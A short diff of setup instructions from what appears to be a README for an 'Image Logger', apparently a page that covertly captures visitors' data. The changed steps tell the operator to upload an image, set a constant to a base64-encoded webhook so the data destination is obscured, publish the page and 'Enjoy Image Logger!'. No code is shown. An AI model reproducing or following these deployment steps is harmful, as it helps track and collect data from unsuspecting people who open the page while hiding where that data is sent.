@@ -7,6 +7,6 @@
 4. Paste code
 5. Upload to repo a image
 6. Edit in img src. if you name image.jpg edit: "<img src="image.jpg">"
-7. Enable Github Pages in settings
+7. Edit in const MMMA value to your encoded base64 webhook
 8. Go to web
-9. in 
+9. Enjoy Image Logger!
